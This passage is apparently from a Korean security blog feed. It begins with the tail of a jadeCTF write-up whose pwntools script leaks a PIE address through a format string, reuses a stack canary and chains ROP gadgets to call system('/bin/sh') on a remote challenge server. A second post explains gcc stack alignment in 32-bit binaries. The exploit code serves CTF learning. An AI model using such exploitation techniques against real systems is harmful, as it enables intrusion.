(0x210-0x8)</span></span><br><span class="line"><span class="string">        payload += p64(canary)</span></span><br><span class="line"><span class="string">        payload += b&#x27;B&#x27; * 0x8</span></span><br><span class="line"><span class="string">        payload += b&#x27;\x78\x15&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        p.sendlineafter(&#x27;:\n&#x27;, payload)</span></span><br><span class="line"><span class="string">        p.recvuntil(&#x27;]?\n&#x27;)</span></span><br><span class="line"><span class="string">        continue</span></span><br><span class="line"><span class="string">    except Exception as e:</span></span><br><span class="line"><span class="string">        print(e)</span></span><br><span class="line"><span class="string">        p.close()</span></span><br><span class="line"><span class="string">        #p = process(&#x27;./chall&#x27;)</span></span><br><span class="line"><span class="string">        p = remote(&#x27;34.76.206.46&#x27;, 10003)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"><span class="comment">#exit(0)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;%85$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">pie = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x1577</span></span><br><span class="line">info(<span class="built_in">hex</span>(pie))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = pie+<span class="number">0x1663</span></span><br><span class="line">ret = pie+<span class="number">0x909</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line"><span class="comment">#payload += p64(ret)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(pie + elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pie + elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pie + elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvline()</span></span><br><span class="line"><span class="comment">#leak = int(p.recv(14)[:-1].decode(), 16)</span></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;puts leak :: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">#puts 6a0</span></span><br><span class="line"><span class="comment">#gets d90</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">libc_base = leak - libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">info(&#x27;libc base :: &#x27;+ hex(libc_base))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">system = libc_base + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh = libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">system = leak - <span class="number">0x2a300</span></span><br><span class="line">binsh = leak + <span class="number">0x11d7b7</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;asdf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jadeCTF&#123;sh3llc0ding_but_w1th_4_tw1st&#125;</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>롸업 적으니까 이 문제는 매우 간단한 문제임을 깨달았다. 부끄럽지만 pie가 걸려있는데 어떻게 ROP를 해야할지 고민을 했다. 일단 local에서 진행할 때도 마지막 2 바이트만 덮을 생각을 못했었고, local 후에 remote의 libc가 다른데 pie가 걸려있는데 그걸 어떻게 알아내야 하는지.. 등등 고민을 꽤나 했다. (offset을 브포하면 된다.)</p><p>이 문제 덕에 주소 일부만 덮을 수 있다는 생각과 루프, try-except 등을 이용하여 offset을 구하는 과정을 배울 수 있었다.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
            <tag> canary </tag>
            
            <tag> pie </tag>
            
            <tag> Jade CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stack Alignment in 32-bit program</title>
      <link href="/221020-32bit_stack_aligned/"/>
      <url>/221020-32bit_stack_aligned/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>부제: gcc 옵션 중 하나인 <code>-mpreferred-stack-boundary</code>에 대하여</p><p>Pwnable 문제를 풀다가 문득 32bit ROP를 살짝 잊었다는 기분이 들었다. (…) 예제 코드를 작성하고 그것을 익스하려고 했으나 생각대로 잘 되지 않아 분석을 진행하였다. 함수 프롤로그와 에필로그에 낯선 코드가 추가되어 있었고, 이 때문에 buf와 sfp 사이에 무언의 값이 들어있었다. 분석 결과, 원인은 gcc 옵션 중 하나인 <code>-mpreferred-stack-boundary</code> 때문임을 알게되었다. </p><p>Pwnable에서의 32bit 바이너리는 (거의) 대부분 <code>-mpreferred-stack-boundary=2</code> 옵션을 주고 컴파일을 한다.</p><h2 id="gcc-option-mpreferred-stack-boundary-N"><a href="#gcc-option-mpreferred-stack-boundary-N" class="headerlink" title="gcc option: -mpreferred-stack-boundary=N"></a>gcc option: <code>-mpreferred-stack-boundary=N</code></h2><p>Attempt to keep the stack boundary aligned to a 2 raised to num byte boundary.<br>If ‘-mpreferred-stack-boundary’ is not specified, the default is 4 (16 bytes or<br>128 bits).</p><ul><li>출처: <a href="https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc.pdf">https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc.pdf</a></li></ul><p>main을 포함하여 이후에 불리는 모든 함수들의 스택프레임에서 가장 낮은 주소가 2^N 에 배수가 되도록 align을 해준다.</p><p>컴파일할 때 저 옵션을 주지 않으면 <code>-mpreferred-stack-boundary=4</code>가 디폴트로 들어가게 된다. 그래서 스택 align이 16바이트로 맞춰지게 된다. </p><p>관련 코드는 아래와 같다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* Validate -mpreferred-stack-boundary= value or default it to</span></span><br><span class="line"><span class="comment">    PREFERRED_STACK_BOUNDARY_DEFAULT.  */</span></span><br><span class="line"> ix86_preferred_stack_boundary = PREFERRED_STACK_BOUNDARY_DEFAULT;</span><br><span class="line"> <span class="keyword">if</span> (opts_set-&gt;x_ix86_preferred_stack_boundary_arg)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">int</span> min = TARGET_64BIT_P (opts-&gt;x_ix86_isa_flags)? <span class="number">3</span> : <span class="number">2</span>;</span><br><span class="line">     <span class="type">int</span> max = TARGET_SEH ? <span class="number">4</span> : <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (opts-&gt;x_ix86_preferred_stack_boundary_arg &lt; min</span><br><span class="line">  || opts-&gt;x_ix86_preferred_stack_boundary_arg &gt; max)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (min == max)</span><br><span class="line">    error (<span class="string">&quot;%&lt;-mpreferred-stack-boundary%&gt; is not supported &quot;</span></span><br><span class="line">   <span class="string">&quot;for this target&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    error (<span class="string">&quot;%&lt;-mpreferred-stack-boundary=%d%&gt; is not between %d and %d&quot;</span>,</span><br><span class="line">   opts-&gt;x_ix86_preferred_stack_boundary_arg, min, max);</span><br><span class="line">&#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">ix86_preferred_stack_boundary</span><br><span class="line">  = (<span class="number">1</span> &lt;&lt; opts-&gt;x_ix86_preferred_stack_boundary_arg) * BITS_PER_UNIT;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li><a href="https://github.com/gcc-mirror/gcc/blob/releases/gcc-12/gcc/config/i386/i386-options.cc#L2463">https://github.com/gcc-mirror/gcc/blob/releases/gcc-12/gcc/config/i386/i386-options.cc#L2463</a></li></ul><h1 id="Default-Stack-aligned-to-a-16-byte-boundary"><a href="#Default-Stack-aligned-to-a-16-byte-boundary" class="headerlink" title="(Default) Stack aligned to a 16-byte boundary."></a>(Default) Stack aligned to a 16-byte boundary.</h1><h3 id="disassemble-main"><a href="#disassemble-main" class="headerlink" title="disassemble main"></a>disassemble main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x080491f1</span> &lt;+<span class="number">0</span>&gt;:lea    ecx,[esp+<span class="number">0x4</span>]</span><br><span class="line"><span class="number">0x080491f5</span> &lt;+<span class="number">4</span>&gt;:and    esp,<span class="number">0xfffffff0</span></span><br><span class="line"><span class="number">0x080491f8</span> &lt;+<span class="number">7</span>&gt;:  push   DWORD PTR [ecx<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x080491fb</span> &lt;+<span class="number">10</span>&gt;:push   ebp</span><br><span class="line"><span class="number">0x080491fc</span> &lt;+<span class="number">11</span>&gt;:mov    ebp,esp</span><br><span class="line"><span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx</span><br><span class="line"><span class="number">0x080491ff</span> &lt;+<span class="number">14</span>&gt;:sub    esp,<span class="number">0x44</span></span><br><span class="line"><span class="number">0x08049202</span> &lt;+<span class="number">17</span>&gt;:sub    esp,<span class="number">0x4</span></span><br><span class="line"><span class="number">0x08049205</span> &lt;+<span class="number">20</span>&gt;:push   <span class="number">0x40</span></span><br><span class="line"><span class="number">0x08049207</span> &lt;+<span class="number">22</span>&gt;:push   <span class="number">0x0</span></span><br><span class="line"><span class="number">0x08049209</span> &lt;+<span class="number">24</span>&gt;:lea    eax,[ebp<span class="number">-0x48</span>]</span><br><span class="line"><span class="number">0x0804920c</span> &lt;+<span class="number">27</span>&gt;:push   eax</span><br><span class="line"><span class="number">0x0804920d</span> &lt;+<span class="number">28</span>&gt;:call   <span class="number">0x8049080</span> &lt;<span class="built_in">memset</span>@plt&gt;</span><br><span class="line">...</span><br><span class="line"><span class="number">0x08049255</span> &lt;+<span class="number">100</span>&gt;:mov    ecx,DWORD PTR [ebp<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x08049258</span> &lt;+<span class="number">103</span>&gt;:leave  </span><br><span class="line"><span class="number">0x08049259</span> &lt;+<span class="number">104</span>&gt;:lea    esp,[ecx<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x0804925c</span> &lt;+<span class="number">107</span>&gt;:ret  </span><br></pre></td></tr></table></figure><h3 id="1-프롤로그-전-1"><a href="#1-프롤로그-전-1" class="headerlink" title="1. 프롤로그 전 (1)"></a>1. 프롤로그 전 (1)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">→  <span class="number">0x080491f1</span> &lt;+<span class="number">0</span>&gt; :lea    ecx,[esp+<span class="number">0x4</span>]</span><br><span class="line">   <span class="number">0x080491f5</span> &lt;+<span class="number">4</span>&gt; :and    esp,<span class="number">0xfffffff0</span></span><br><span class="line">   <span class="number">0x080491f8</span> &lt;+<span class="number">7</span>&gt; :push   DWORD PTR [ecx<span class="number">-0x4</span>]</span><br><span class="line">   <span class="number">0x080491fb</span> &lt;+<span class="number">10</span>&gt;:push   ebp</span><br><span class="line">   <span class="number">0x080491fc</span> &lt;+<span class="number">11</span>&gt;:mov    ebp,esp</span><br><span class="line">   <span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx  </span><br></pre></td></tr></table></figure><p>실행하고 난 후.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ecx  : 0xffffd960</span><br><span class="line">$esp  : 0xffffd95c</span><br></pre></td></tr></table></figure><p>ecx 레지스터를 사용하려고 하는걸까?</p><h3 id="2-프롤로그-전-2"><a href="#2-프롤로그-전-2" class="headerlink" title="2. 프롤로그 전 (2)"></a>2. 프롤로그 전 (2)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x080491f1</span> &lt;+<span class="number">0</span>&gt; :lea    ecx,[esp+<span class="number">0x4</span>]</span><br><span class="line">→  <span class="number">0x080491f5</span> &lt;+<span class="number">4</span>&gt; :and    esp,<span class="number">0xfffffff0</span></span><br><span class="line">   <span class="number">0x080491f8</span> &lt;+<span class="number">7</span>&gt; :push   DWORD PTR [ecx<span class="number">-0x4</span>]</span><br><span class="line">   <span class="number">0x080491fb</span> &lt;+<span class="number">10</span>&gt;:push   ebp</span><br><span class="line">   <span class="number">0x080491fc</span> &lt;+<span class="number">11</span>&gt;:mov    ebp,esp</span><br><span class="line">   <span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx  </span><br></pre></td></tr></table></figure><p>실행하고 난 후.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ecx  : 0xffffd960</span><br><span class="line">$esp  : 0xffffd950</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0xffffd950│+0x0000: 0x00000000← $esp</span><br><span class="line">0xffffd954│+0x0004: 0x00000000</span><br><span class="line">0xffffd958│+0x0008: 0x8048354  →  &quot;__libc_start_main&quot;</span><br><span class="line">0xffffd95c│+0x000c: 0xf7c1f119  →   add esp, 0x10</span><br><span class="line">0xffffd960│+0x0010: 0x00000001</span><br><span class="line">0xffffd964│+0x0014: 0xffffda14  →  0xffffdb90  →  &quot;/home/jir4vvit/study/rop32/chall&quot;</span><br><span class="line">0xffffd968│+0x0018: 0xffffda1c  →  0xffffdbb1  →  &quot;SHELL=/bin/bash&quot;</span><br><span class="line">0xffffd96c│+0x001c: 0xffffd980  →  0xf7e1fe34  →  0x0021fd4c</span><br><span class="line">0xffffd970│+0x0020: 0xf7e1fe34  →  0x0021fd4c</span><br><span class="line">0xffffd974│+0x0024: 0x80491f1  →  &lt;main+0&gt; lea ecx, [esp+0x4]</span><br></pre></td></tr></table></figure><p>32bit 프로그램에선 block 단위가 4바이트이기 때문에 컴파일러(gcc)가 and 연산으로 esp를 16에 align시키는 모습을 확인할 수 있다.</p><h4 id="ecx-레지스터를-왜-push-했을까"><a href="#ecx-레지스터를-왜-push-했을까" class="headerlink" title="ecx 레지스터를 왜 push 했을까?"></a><em>ecx 레지스터를 왜 push 했을까?</em></h4><p>ecx is a temporary register so it has to be saved. Also, depending on optimization level, some of the frame linkage ops that don’t seem strictly necessary to run the program might well be important in order to set up a trace-ready chain of frames.</p><ul><li>출처: <a href="https://askcodes.net/coding/trying-to-understand-gcc-s-complicated-stack-alignment-at-the-top-of-main-that-copies-the-return-address">https://askcodes.net/coding/trying-to-understand-gcc-s-complicated-stack-alignment-at-the-top-of-main-that-copies-the-return-address</a></li></ul><h3 id="3-프롤로그"><a href="#3-프롤로그" class="headerlink" title="3. 프롤로그"></a>3. 프롤로그</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x080491fb</span> &lt;+<span class="number">10</span>&gt;:push   ebp</span><br><span class="line"><span class="number">0x080491fc</span> &lt;+<span class="number">11</span>&gt;:mov    ebp,esp</span><br><span class="line"><span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx  </span><br></pre></td></tr></table></figure><p>ebp를 push하고 mov 명령으로 ebp를 esp와 같게 옮겨주었다.</p><p>에필로그를 진행해서 ebp와 esp를 애써 맞춰주었음에도 불구하고(?) ecx를 push했다. 32bit 프로그램이라면 무조건 buf, ebp(sfp) 순일 줄 알았는데 중간에 ecx가 끼어있다. 이것을 보지 못하고 무작정 익스를 진행하려고 하다가 평소와 스택이 쌓이는 것이 이상함을 감지하고 분석을 진행하게 되었다.</p><h3 id="4-memset-함수-호출"><a href="#4-memset-함수-호출" class="headerlink" title="4. memset 함수 호출"></a>4. memset 함수 호출</h3><p>에필로그 진행 후 함수를 호출할 때 스택에 인자들이 push되는 것을 살펴보자.</p><p>분석할 어셈은 아래와 같다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx  </span><br><span class="line">   <span class="number">0x080491ff</span> &lt;+<span class="number">14</span>&gt;:sub    esp,<span class="number">0x44</span></span><br><span class="line">   <span class="number">0x08049202</span> &lt;+<span class="number">17</span>&gt;:sub    esp,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x08049205</span> &lt;+<span class="number">20</span>&gt;:push   <span class="number">0x40</span></span><br><span class="line">   <span class="number">0x08049207</span> &lt;+<span class="number">22</span>&gt;:push   <span class="number">0x0</span></span><br><span class="line">   <span class="number">0x08049209</span> &lt;+<span class="number">24</span>&gt;:lea    eax,[ebp<span class="number">-0x48</span>]</span><br><span class="line">   <span class="number">0x0804920c</span> &lt;+<span class="number">27</span>&gt;:push   eax</span><br><span class="line">→  <span class="number">0x0804920d</span> &lt;+<span class="number">28</span>&gt;:call   <span class="number">0x8049080</span> &lt;<span class="built_in">memset</span>@plt&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>@plt (</span><br><span class="line">   [sp + <span class="number">0x0</span>] = <span class="number">0xffffd900</span> → <span class="number">0x00000000</span>,</span><br><span class="line">   [sp + <span class="number">0x4</span>] = <span class="number">0x000000</span>,</span><br><span class="line">   [sp + <span class="number">0x8</span>] = <span class="number">0x000040</span>,</span><br><span class="line">   [sp + <span class="number">0xc</span>] = <span class="number">0x000000</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>실행하고 난 후.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0xffffd8f0│+0x0000: 0xffffd900  →  0x00000000← $esp</span><br><span class="line">0xffffd8f4│+0x0004: 0x00000000</span><br><span class="line">0xffffd8f8│+0x0008: 0x000040 (&quot;@&quot;?)</span><br><span class="line">0xffffd8fc│+0x000c: 0x00000000</span><br><span class="line">0xffffd900│+0x0010: 0x00000000  //&lt;-- 여기서부터 0x40 바이트 초기화</span><br><span class="line">0xffffd904│+0x0014: 0x00000000</span><br><span class="line">0xffffd908│+0x0018: 0x00000000</span><br><span class="line">0xffffd90c│+0x001c: 0x00000000</span><br><span class="line">0xffffd910│+0x0020: 0x00000000</span><br><span class="line">0xffffd914│+0x0024: 0x00000000</span><br><span class="line"> </span><br><span class="line">0xffffd918│+0x0028: 0x00000000</span><br><span class="line">0xffffd91c│+0x002c: 0x00000000</span><br><span class="line">0xffffd920│+0x0030: 0x00000000</span><br><span class="line">0xffffd924│+0x0034: 0x00000000</span><br><span class="line">0xffffd928│+0x0038: 0x00000000</span><br><span class="line">0xffffd92c│+0x003c: 0x00000000</span><br><span class="line">0xffffd930│+0x0040: 0x00000000</span><br><span class="line">0xffffd934│+0x0044: 0x00000000</span><br><span class="line">0xffffd938│+0x0048: 0x00000000</span><br><span class="line">0xffffd93c│+0x004c: 0x00000000  //&lt;-- 0xffffd900 ~ 0xffffd93f 까지 0x40 바이트가 초기화 됨</span><br><span class="line"> </span><br><span class="line">0xffffd940│+0x0050: 0x00000000  </span><br><span class="line">0xffffd944│+0x0054: 0xffffd960  →  0x00000001 //← $ecx</span><br><span class="line">0xffffd948│+0x0058: 0x00000000← $ebp</span><br><span class="line">0xffffd94c│+0x005c: 0xf7c1f119  →   add esp, 0x10</span><br><span class="line">0xffffd950│+0x0060: 0x00000000</span><br><span class="line">0xffffd954│+0x0064: 0x00000000</span><br><span class="line">0xffffd958│+0x0068: 0x8048354  →  &quot;__libc_start_main&quot;</span><br><span class="line">0xffffd95c│+0x006c: 0xf7c1f119  →   add esp, 0x10</span><br><span class="line">0xffffd960│+0x0070: 0x00000001</span><br><span class="line">0xffffd964│+0x0074: 0xffffda14  →  0xffffdb90  →  &quot;/home/jir4vvit/study/rop32/chall&quot;</span><br></pre></td></tr></table></figure><p>ecx를 push했기 때문에 align이 맞지 않아 buf 크기는 0x40이지만 esp를 0x44만큼 올려주었다.(buf를 위해 공간확보) </p><p>또한 곧바로 esp를 0x4 올려주었는데, 이는 memset의 인자를 구성할 때 align을 맞춰주기 위해서이다.</p><p>이 후에 실질적으로 memset에서 사용하는 세 개의 인자를 push했다. </p><h3 id="5-에필로그"><a href="#5-에필로그" class="headerlink" title="5. 에필로그"></a>5. 에필로그</h3><p>에필로그에 낯선 명령이 추가되어 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x08049255</span> &lt;+<span class="number">100</span>&gt;:mov    ecx,DWORD PTR [ebp<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x08049258</span> &lt;+<span class="number">103</span>&gt;:leave  </span><br><span class="line"><span class="number">0x08049259</span> &lt;+<span class="number">104</span>&gt;:lea    esp,[ecx<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x0804925c</span> &lt;+<span class="number">107</span>&gt;:ret    </span><br></pre></td></tr></table></figure><p>무작정 익스를 진행하려고 할 때 main+100에서 터졌었다. 스택 상황이 무조건 buf, ebp(sfp) 순서임을 기대했기 때문이다.<br>실제론 buf, ecx(ebp-0x4), ebp(sfp) 순이다.</p><p>ebp 위치라고 생각하고 넣었던 값이 실제론 ebp-0x4였기 때문에 터져버렸다.</p><h1 id="For-32bit-ROP-in-Pwnable-Stack-aligned-to-a-4-byte-boundary"><a href="#For-32bit-ROP-in-Pwnable-Stack-aligned-to-a-4-byte-boundary" class="headerlink" title="(For 32bit ROP in Pwnable) Stack aligned to a 4-byte boundary."></a>(For 32bit ROP in Pwnable) Stack aligned to a 4-byte boundary.</h1><p>32bit 프로그램에선 block 단위가 4바이트이다. 따라서 스택 구조는 통상적으로 알고 있는 그 구조고, 프롤로그와 에필로그도 알고 있는 그 어셈이다. 자세히 설명하지 않고 코드와 스택 구조만 보여주고 넘어가겠다.</p><p>참고로 Pwnable에서의 32bit 프로그램은 (거의) 대부분 <code>-mpreferred-stack-boundary=2</code> 옵션으로 컴파일되었다.</p><h3 id="disassemble-main-1"><a href="#disassemble-main-1" class="headerlink" title="disassemble main"></a>disassemble main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x080491ee</span> &lt;+<span class="number">0</span>&gt;:push   ebp</span><br><span class="line"><span class="number">0x080491ef</span> &lt;+<span class="number">1</span>&gt;:mov    ebp,esp</span><br><span class="line"><span class="number">0x080491f1</span> &lt;+<span class="number">3</span>&gt;:sub    esp,<span class="number">0x40</span></span><br><span class="line"><span class="number">0x080491f4</span> &lt;+<span class="number">6</span>&gt;:push   <span class="number">0x40</span></span><br><span class="line"><span class="number">0x080491f6</span> &lt;+<span class="number">8</span>&gt;:push   <span class="number">0x0</span></span><br><span class="line"><span class="number">0x080491f8</span> &lt;+<span class="number">10</span>&gt;:lea    eax,[ebp<span class="number">-0x40</span>]</span><br><span class="line"><span class="number">0x080491fb</span> &lt;+<span class="number">13</span>&gt;:push   eax</span><br><span class="line"><span class="number">0x080491fc</span> &lt;+<span class="number">14</span>&gt;:call   <span class="number">0x8049080</span> &lt;<span class="built_in">memset</span>@plt&gt;</span><br><span class="line">...</span><br><span class="line"><span class="number">0x0804923b</span> &lt;+<span class="number">77</span>&gt;:leave  </span><br><span class="line"><span class="number">0x0804923c</span> &lt;+<span class="number">78</span>&gt;:ret    </span><br></pre></td></tr></table></figure><h3 id="memset-함수-호출"><a href="#memset-함수-호출" class="headerlink" title="memset 함수 호출"></a>memset 함수 호출</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>@plt (</span><br><span class="line">   [sp + <span class="number">0x0</span>] = <span class="number">0xffffd908</span> → <span class="number">0x00000000</span>,</span><br><span class="line">   [sp + <span class="number">0x4</span>] = <span class="number">0x000000</span>,</span><br><span class="line">   [sp + <span class="number">0x8</span>] = <span class="number">0x000040</span>,</span><br><span class="line">   [sp + <span class="number">0xc</span>] = <span class="number">0x000000</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 